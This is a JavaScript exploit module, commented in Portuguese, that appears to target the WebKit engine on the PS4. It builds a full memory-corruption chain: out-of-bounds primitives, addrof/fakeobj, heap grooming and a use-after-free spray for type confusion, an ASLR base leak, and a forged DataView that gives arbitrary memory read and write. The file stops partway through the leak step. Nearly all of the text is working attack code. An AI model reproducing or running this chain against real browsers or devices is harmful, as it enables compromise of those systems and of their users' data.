// js/script3/testArrayBufferVictimCrash.mjs (v03 - Otimização do Spray UAF e Robustez Aprimorada)
// =======================================================================================
// ESTA VERSÃO INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
// 1. Validar primitivas básicas (OOB local).
// 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
//    - Estratégia de Spray Otimizada para evitar travamentos no PS4.
//    - Múltiplas tentativas de UAF se o vazamento inicial falhar.
//    - Heap Grooming mais refinado e foco nos tamanhos de alocação do bmalloc.
// 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
// 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read,
    arb_write,
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "v03 - Otimização do Spray UAF e Robustez Aprimorada";

// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
const LOCAL_VERY_SHORT_PAUSE = 10;
const LOCAL_SHORT_PAUSE = 100;
const LOCAL_MEDIUM_PAUSE = 750;
const LOCAL_LONG_PAUSE = 1500;

let global_spray_objects = []; // Usado para o spray inicial de heap grooming de alto volume
let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente (vítimas, sprays UAF, etc.)

// Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
let _fake_data_view = null;


// Funções Auxiliares Comuns (dumpMemory)
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": ";
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    // Passar logFn para arbReadFn, se necessário para depuração interna de arbRead
                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    // Preenche o resto da linha com '??' e '?' após um erro de leitura
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break; // Sai do loop interno e vai para a próxima linha
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}

export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    // O CONTENTS_IMPL_POINTER_OFFSET aponta para o m_vector no ArrayBuffer real que está sendo forjado como DataView.
    // É o campo que precisamos controlar para ler/escrever arbitrariamente.
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    // Salvamos/restauramos o m_vector usando arb_read/arb_write (OOB local)
    // Estas são as primitivas que funcionam com o DataView OOB expandido.
    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        // MUITO IMPORTANTE: Sempre restaurar o m_vector para evitar corrupções futuras
        // se o fake_data_view for usado novamente ou se o GC o inspecionar.
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return value; // Retorna o valor escrito para consistência
}

// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
function _doubleToInt64_direct(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

function _int64ToDouble_direct(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

/**
 * Tenta configurar a primitiva de leitura/escrita arbitrária universal usando fakeobj com um dado m_mode.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
 * @param {number} m_mode_to_try O valor de m_mode a ser testado.
 * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
 */
async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
    const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);

    _fake_data_view = null;
    let backing_array_buffer = null;

    try {
        // Criar um ArrayBuffer real que será corrompido para se tornar um DataView forjado.
        backing_array_buffer = new ArrayBuffer(0x1000); // Tamanho suficiente para metadados e espaço para teste
        hold_objects.push(backing_array_buffer); // Mantém o backing_array_buffer vivo para evitar GC prematuro
        const backing_ab_addr = addrof_core(backing_array_buffer);
        logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);

        // AQUI ESTAMOS USANDO AS PRIMITIVAS ARB_READ/ARB_WRITE DO CORE_EXPLOIT (que funcionam localmente no OOB)
        // PARA CORROMPER OS METADADOS DO 'backing_array_buffer' no heap JS.
        // 1. Corromper o ponteiro da Structure (JSCell.STRUCTURE_POINTER_OFFSET) para o vtable da DataView Structure.
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
        // 2. Definir o ponteiro de dados (ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET) para 0 (nulo) inicialmente.
        //    Isso evita acessos inválidos antes que a primitiva ARB R/W seja testada e o ponteiro seja ajustado.
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8);
        // 3. Definir o tamanho em bytes (ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START) para o máximo (0xFFFFFFFF).
        //    Isso permite que o DataView "forjado" acesse qualquer lugar na memória.
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4);
        // 4. Definir o m_mode (ArrayBufferView.M_MODE_OFFSET) para o valor candidato atual.
        //    O m_mode é crucial para o tipo e comportamento da ArrayBufferView (DataView, Uint8Array, etc.).
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
        logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);

        // Criar o DataView forjado usando a primitiva fakeobj_core.
        // Isso fará com que o motor JS trate o 'backing_array_buffer' como um DataView.
        _fake_data_view = fakeobj_core(backing_ab_addr);
        if (!(_fake_data_view instanceof DataView)) {
            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
            return false;
        }
        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);

        // Testar a primitiva de leitura/escrita arbitrária universal recém-criada
        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
        hold_objects.push(test_target_js_object); // Mantém o objeto de teste vivo
        const test_target_js_object_addr = addrof_core(test_target_js_object);

        // Antes de testar o _fake_data_view, precisamos apontar o m_vector dele para o endereço do nosso objeto de teste.
        // O m_vector do _fake_data_view é na verdade o JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET dentro do `backing_array_buffer`.
        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
        await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);

        const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
        // Tentar escrever no offset 0 do DataView forjado (que agora aponta para test_target_js_object_addr)
        _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
        const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);

        // Verificar se a escrita/leitura foi bem-sucedida e refletida no objeto original
        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
            // Restaurar o ponteiro de dados do _fake_data_view para 0 para evitar corrupções futuras
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return true;
        } else {
            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
            logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
            // Restaurar o ponteiro de dados mesmo em caso de falha para minimizar danos
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return false;
        }
    } catch (e) {
        logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        // Tentar restaurar o ponteiro de dados do _fake_data_view, se possível, antes de retornar falso
        try {
            if (backing_array_buffer) {
                const backing_ab_addr = addrof_core(backing_array_buffer);
                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
                await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            }
        } catch (cleanupErr) {
            logFn(`[${FNAME}] ERRO durante limpeza (restauração do m_vector) após falha de L/E Universal: ${cleanupErr.message}`, "error", FNAME);
        }
        return false;
    } finally {
        // Remover backing_array_buffer de hold_objects para que possa ser coletado pelo GC
        if (backing_array_buffer) {
            const index = hold_objects.indexOf(backing_array_buffer);
            if (index > -1) { hold_objects.splice(index, 1); }
        }
        _fake_data_view = null; // Resetar para garantir que o próximo teste comece limpo
    }
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF (Integradas) ---

// Função para forçar Coleta de Lixo
async function triggerGC(logFn, pauseFn) {
    logFn("    Acionando GC...", "info", "GC_Trigger");
    // Alocações grandes para forçar o GC. Reduzido para ser menos agressivo em sistemas limitados.
    try {
        for (let i = 0; i < 500; i++) { // 500 iterações * 256KB = 128MB de alocação temporária
            new ArrayBuffer(1024 * 256);
        }
    } catch (e) {
        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
    }
    await pauseFn(LOCAL_SHORT_PAUSE); // Dá tempo para o GC executar

    // Pequenas alocações para ajudar o GC a perceber a pressão da memória e limpar objetos.
    for (let i = 0; i < 25; i++) {
        new ArrayBuffer(1024); // 25KB adicionais
    }
    await pauseFn(LOCAL_SHORT_PAUSE); // Dar mais tempo para o GC.
}

/**
 * Cria um objeto vítima e tenta um spray UAF mais robusto com heap grooming.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
 * @returns {object|null} A referência pendurada se bem-sucedido, null caso contrário.
 */
async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    let dangling_ref = null;
    const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
    // Este tamanho é um múltiplo de 16 (0x80 / 0x10 = 8), o que pode se alinhar bem aos buckets do bmalloc.
    const SPRAY_COUNT_UAF_OPT = 2000; // Otimizado para 2000 objetos de spray para PS4
    const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima

    logFn(`[UAF] Iniciando spray e criação de ponteiro pendurado (v03)...`, "info");

    // FASE 1: Heap Grooming (Preparação do Heap)
    // O objetivo é "pré-alocar" e liberar memória para criar um ambiente de heap mais previsível.
    // Isso tenta "esvaziar" ou "fragmentar" intencionalmente certos buckets do heap.
    const HEAP_GROOMING_SPRAY_COUNT = 15000; // Um pouco mais agressivo que a v02, mas ainda controlado.
    const grooming_spray_before_victim = [];
    logFn(`[UAF] FASE 1: Heap Grooming com ${HEAP_GROOMING_SPRAY_COUNT} objetos de tamanhos variados para preparar o heap...`, "subtest");
    for (let i = 0; i < HEAP_GROOMING_SPRAY_COUNT; i++) {
        // Criar objetos de tamanhos que podem cair em diferentes buckets do bmalloc.
        // A variação é baseada em múltiplos de 16 bytes.
        const size_variant = (i % 16) * 0x10 + 0x40; // Ex: 0x40, 0x50, ..., 0x130
        grooming_spray_before_victim.push(new ArrayBuffer(size_variant));
    }
    hold_objects.push(grooming_spray_before_victim); // Mantém o grooming spray vivo até depois da vítima ser alocada
    await pauseFn(LOCAL_SHORT_PAUSE); // Dar um tempo para o alocador assentar (opcional, mas pode ajudar)

    // PASSO 2: Criar o objeto vítima que será liberado.
    // O tipo de objeto (Float64Array) é crucial para como o ponteiro será lido.
    // A confusão de tipos ocorrerá quando o JS tentar ler dangling_ref[0] e encontrar o valor que pulverizamos.
    let victim_object_arr = new Float64Array(VICTIM_SIZE_BYTES / 8); // Float64Array para UAF (128 bytes = 16 doubles)
    victim_object_arr[0] = 1.000000000000123; // Um double com valor inicial conhecido para debug.
    victim_object_arr[1] = 2.0;

    // Para evitar que o GC colete 'victim_object_arr' antes que o dangling_ref seja criado.
    hold_objects.push(victim_object_arr);

    // A referência pendurada é a própria 'victim_object_arr'.
    dangling_ref = victim_object_arr;

    // Forçar otimizações (acessando a vítima repetidamente)
    // Aumentado para mais iterações para garantir que o JIT compile a função e otimize
    // o acesso a `victim_object_arr`, tornando-o um candidato ideal para o Type Confusion.
    for (let i = 0; i < 10000; i++) { // Mais iterações (aumentado de 1000 para 10000)
        victim_object_arr[0] += 0.000000000000001; // Pequena alteração para forçar JIT
    }

    logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada.`, "info");
    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
    logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");

    // PASSO 3: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
    logFn("--- FASE 2: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
    // Remova a referência 'victim_object_arr' do array de retenção para torná-lo elegível para GC.
    const ref_index = hold_objects.indexOf(victim_object_arr);
    if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
    victim_object_arr = null; // Remova a última referência forte.
    await triggerGC(logFn, pauseFn);
    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");
    await pauseFn(LOCAL_SHORT_PAUSE); // Pequena pausa extra após o GC

    // Remover o grooming spray inicial para liberar esses blocos para reuso pelo spray principal
    grooming_spray_before_victim.length = 0;
    const groom_index = hold_objects.indexOf(grooming_spray_before_victim);
    if (groom_index > -1) { hold_objects.splice(groom_index, 1); }
    await triggerGC(logFn, pauseFn); // Forçar GC para limpar o grooming spray
    logFn("    Grooming spray inicial liberado.", "info");
    await pauseFn(LOCAL_SHORT_PAUSE);

    // PASSO 4: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
    logFn("--- FASE 3: Pulverizando Float64Array com ponteiros sobre a memória liberada (otimizado e focado) ---", "subtest");
    const spray_arrays = [];

    // Para o spray inicial, queremos que o valor lido seja um ponteiro para a Structure da DataView.
    // Um ponteiro de objeto em JSValue geralmente tem a tag 0x402a no high (para 64 bits).
    // O offset do vtable da DataView é 0x3AD62A0.
    // Assumiremos uma base hardcoded para CONSTRUIR O VALOR A SER PULVERIZADO.
    // A base REAL será vazada pelo UAF.
    // O valor 0x402a0000 é a "tag" de ponteiro de objeto para doubles em WebKit.
    const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base WebKit (apenas para simular um ponteiro)
    const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);

    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);

    const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000; // Tag comum para ponteiros de objetos em doubles.
    const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_EXPECTED;
    TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);


    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
    logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag ${toHex(OBJECT_PTR_TAG_HIGH_EXPECTED)} e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");

    for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
        // Usamos ArrayBuffer para o spray, pois é o que esperamos que o Float64Array seja sobreposto.
        // O Float64Array é apenas a "view" sobre a memória que esperamos que seja um ArrayBuffer
        // após a reocupação do UAF.
        const buf = new ArrayBuffer(SPRAY_BUF_SIZE_BYTES);
        // Criar um DataView ou Uint8Array para preencher o ArrayBuffer.
        // Se usar Float64Array para preencher, ele também adicionará metadados internos.
        // O ideal é usar Uint8Array ou DataView para ter controle preciso sobre os bytes.
        const view = new Uint8Array(buf); // Usar Uint8Array para preenchimento de byte a byte
        const view64 = new Float64Array(buf); // Para colocar o double diretamente no início

        // Coloca o ponteiro da Structure (já taggeado) no início do buffer.
        // Isso é o que esperamos que seja lido quando dangling_ref[0] for acessado.
        view64[0] = spray_value_double_to_leak_ptr;

        // Preenche o restante do buffer com um padrão reconhecível para depuração.
        // Isso pode ajudar a confirmar se o spray está reocupando a memória.
        for (let j = 8; j < view.length; j++) { // Começa do offset 8 (após o double do ponteiro)
            view[j] = (0xAA + j) % 256; // Padrão variado
        }
        spray_arrays.push(buf);
    }
    hold_objects.push(spray_arrays); // Mantém os buffers em spray vivos.
    logFn(`    Pulverização de ${spray_arrays.length} ArrayBuffers concluída sobre a memória da vítima.`, "info");
    await pauseFn(LOCAL_SHORT_PAUSE); // Pausa após o spray para permitir estabilização

    return dangling_ref; // Retorna a referência pendurada que agora está "confusa"
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST = "Teste Uaf Type Confusion";
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");

    let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
    const startTime = performance.now();
    let webkit_base_address = null;
    let found_m_mode = null;
    const UAF_ATTEMPTS = 5; // Aumentadas as tentativas de UAF para maior robustez

    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
        const sprayStartTime = performance.now();
        const INITIAL_SPRAY_COUNT = 250000; // Reduzido para 250.000 para ser mais amigável ao PS4
        logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
            // Variar tamanhos em múltiplos de 16 para preencher buckets de forma mais heterogênea.
            const dataSize = 50 + (i % 50) * 16; // De 50 a 800 elementos, em múltiplos de 16
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        const oob_data_view = getOOBDataView();
        if (!oob_data_view) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        // Inicializar addrof_core e fakeobj_core
        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");


        // --- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR (Múltiplas Tentativas) ---
        logFn("--- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR (Múltiplas Tentativas) ---", "subtest");

        let uaf_leak_success = false;
        let leaked_jsvalue_from_uaf_double = 0;
        let dangling_ref_from_uaf = null;

        for (let attempt = 1; attempt <= UAF_ATTEMPTS; attempt++) {
            logFn(`[UAF LEAK] Tentativa ${attempt}/${UAF_ATTEMPTS} para vazamento de ASLR via UAF/TC.`, "subtest");

            // Limpar objetos anteriores (incluindo o spray inicial) para tentar um estado de heap mais limpo para a nova tentativa UAF
            // Esvaziar global_spray_objects
            global_spray_objects.length = 0;
            // Esvaziar hold_objects, exceto a própria dangling_ref se ela ainda estiver ativa de uma tentativa anterior
            hold_objects = hold_objects.filter(obj => obj === dangling_ref); // Tentar reter apenas a dangling_ref se ela já existe e precisa ser relida.
            if (hold_objects.length > 0) { // Se sobrou algo em hold_objects, libere.
                hold_objects = [];
            }
            await triggerGC(logFn, pauseFn); // Forçar GC antes de cada tentativa UAF
            logFn(`    Heap limpo antes da Tentativa UAF #${attempt}.`, "info");
            await pauseFn(LOCAL_SHORT_PAUSE);


            dangling_ref_from_uaf = await sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM);

            if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
                 logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}. Tentativa ${attempt} falhou.`, "critical");
                 if (attempt === UAF_ATTEMPTS) {
                     throw new Error("A referência pendurada não se tornou o Float64Array pulverizado após N tentativas.");
                 }
                 continue; // Tentar a próxima iteração
            }

            // Tentar ler múltiplas vezes para garantir que o valor seja estável
            let read_attempts = 10; // Aumentar as tentativas de leitura para maior confiabilidade
            for(let i = 0; i < read_attempts; i++) {
                leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento do Float64Array sobreposto
                const leaked_int64_debug = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);

                // Verificar se o valor lido corresponde ao padrão de spray esperado
                const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
                // Verificar se o high part do valor lido corresponde à tag esperada para um ponteiro de objeto.
                const isTaggedPointer = (leaked_int64_debug.high() & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH_EXPECTED & 0xFFFF0000);

                if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0 && isTaggedPointer) {
                     logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (tentativa ${i+1}/${read_attempts}, UAF Attempt ${attempt}): ${toHex(leaked_int64_debug, 64)}`, "leak");
                     uaf_leak_success = true;
                     break; // Se encontrou um valor que parece um ponteiro taggeado, sai
                }
                logFn(`[UAF LEAK] Valor lido inesperado em dangling_ref[0]: ${toHex(leaked_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts})`, "warn");
                await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa entre as tentativas de leitura
            }

            if (uaf_leak_success) {
                logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");

                // Untag o ponteiro vazado (lógica do addrof_core)
                let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
                const original_high = untagged_uaf_addr.high();
                const untagged_high = original_high & 0x0000FFFF; // Remove a tag superior (0x402a0000)

                untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
                logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag 0x402a): ${untagged_uaf_addr.toString(true)}`, "leak");

                // Calcular a base da biblioteca WebKit
